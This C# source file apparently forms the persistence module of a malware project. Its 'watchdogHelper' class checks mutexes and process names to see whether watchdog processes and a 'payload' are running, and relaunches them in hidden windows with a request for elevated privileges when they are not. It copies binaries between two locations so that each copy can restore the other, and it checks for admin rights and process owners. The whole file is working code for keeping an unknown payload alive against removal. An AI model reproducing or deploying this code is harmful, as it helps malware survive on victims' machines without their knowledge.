using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Management.Automation;
using System.Security.Principal;
using System.Threading;
using System.Xml.Linq;


    public class watchdogHelper
    {

        private static bool IsMutexRunning(string mutexName)
        {
            bool isNewInstance;
        try
        {
            // Attempt to create a mutex with the specified name
            using (Mutex mutex = new Mutex(false, mutexName, out isNewInstance))
            {
                // If a new instance was created, it means no other instance was running
                if (isNewInstance)
                {
                    // Release the mutex so it's not held by this check
                    return false;
                }
                else
                {
                    // If we couldn't create a new instance, another instance is already running
                    return true;
                }
            }
        }
        catch (Exception ex) {
            Log($"Error verifying if mutex is running: {ex.Message}");
            return false;
        }
        }

        private static bool IsProcessRunning(string processName)
        {
            // Get a list of processes by name
            processName = processName.Replace(".exe", "");

            Process[] processes = Process.GetProcessesByName(processName); //does processes by name when mutex cant be used (for the payload)
            return processes.Length > 0;
        }

        public static void Log(string message)
        {
            if (Config.Debugging)
            { //logs when specified by user in Config
                Console.WriteLine(message);
            }
        }

        public static void verifyFilePathsSourceAndDest(string destinationPath, string filename) //checks for if file exists then copies it if not
        {
            try
            {
            string currentDirectory = Directory.GetCurrentDirectory();
            string sourcePathFile = Path.Combine(currentDirectory, filename);
            string destPathFile = Path.Combine(destinationPath, filename);


            EnsureDirectoryExists(destinationPath);


            if (File.Exists(destPathFile) && File.Exists(sourcePathFile))
            {
                return;
            }
            else
            {

                if (File.Exists(sourcePathFile))
                {
                    // Copy the .exe to the destination
                    try
                    {
                        File.Copy(sourcePathFile, destPathFile, overwrite: false);
                        Log($"'{filename}' found and copied to {destPathFile}");
                    }
                    catch (Exception ex)
                    {
                        Log($"Error copying file: {ex.Message}");
                    }
                }
                else if (File.Exists(destPathFile))
                {
                    try
                    {
                        File.Copy(destPathFile, sourcePathFile, overwrite: false);
                        Log($"'{filename}' found and copied to {sourcePathFile}");
                    }
                    catch (Exception ex)
                    {
                        Log($"Error copying file: {ex.Message}");
                    }
                }
                else
                {
                    Log($"'{filename}' not found in the current directory.");
                }
            }
        }
        catch (Exception ex) {
            Log($"Error verifying and copying filepaths: {ex.Message}");
        }
        }


        private static void runBinary(string filePath, string arguments = "")
        {
        try
        {
            // Create a new ProcessStartInfo for the executable
            ProcessStartInfo startInfo = new ProcessStartInfo
            {
                FileName = filePath,
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                CreateNoWindow = true,
                Verb = "runas" // Request elevated privileges
            };

            // Create a new instance of Process each time
            using (Process process = new Process())
            {
                process.StartInfo = startInfo;
                process.Start();

                // Optionally, handle output asynchronously if needed
                process.OutputDataReceived += (sender, e) =>
                {
                    if (e.Data != null)
                    {
                        // Handle output data here
                        Log($"Log from running binary: {e.Data}");
                    }
                };
                process.BeginOutputReadLine();

                // Note: No WaitForExit(), allowing the process to run without blocking
            }
        }
        catch (Exception ex) { 
        Log($"Error Running Binary: {ex.Message}");
        }
        }


    public static bool IsRunningAsAdministrator()
    {
        WindowsIdentity identity = WindowsIdentity.GetCurrent();
        WindowsPrincipal principal = new WindowsPrincipal(identity);
        return principal.IsInRole(WindowsBuiltInRole.Administrator);
    }

    public static string GetProcessOwner(int pid)
    {
        try
        {
            string query = $"SELECT * FROM Win32_Process WHERE ProcessId = {pid}";
            using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(query))
            {
                foreach (ManagementObject obj in searcher.Get())
                {
                    // Prepare variables for output
                    string user = string.Empty;
                    string domain = string.Empty;

                    // Get the owner information
                    obj.InvokeMethod("GetOwner", new object[] { user, domain });

                    // Return formatted string
                    return $"{user}@{domain}";
                }
            }
        }
        catch (ManagementException)
        {
            return "Process not found";
        }
        catch (Exception ex)
        {
            return $"Error: {ex.Message}";
        }
        return "Owner not found";
    }

    public static int? GetProcessIdByName(string processName)
    {
        try
        {
            Process[] processes = Process.GetProcessesByName(processName);

            foreach (var process in processes)
            {
                // Skip the current process
                if (process.Id == Process.GetCurrentProcess().Id) continue;

                // Return the ID of the first instance found that's not the current process
                return process.Id;
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine("Error: " + ex.Message);
        }

        return null; // Return null if no process is found or an error occurs
    }


    public static void CheckAndRunWatchdog(string watchdogPath, string watchdogName, string mutex)
        {
            if (!IsMutexRunning(mutex)) // uses mutexes to verify whether watchdogs are running
        {
                runBinary(Path.Combine(watchdogPath, watchdogName));
            }
        }

        public static void CheckAndRunPayload(string payloadPath, string payloadName)
        {
            if (!IsProcessRunning(payloadName)) // uses the filename to verify whether payload is running
        {
                runBinary(Path.Combine(payloadPath, payloadName));
            }
        }

        public static void EnsureDirectoryExists(string dirPath)
        {
            try
            {
                if (!Directory.Exists(dirPath))
                {
                    Directory.CreateDirectory(dirPath);
                }
            }
            catch (Exception ex)
            {
                // Log or handle the exception here
                Log($"An error occurred while creating the directory: {ex.Message}");
            }
        }


    }
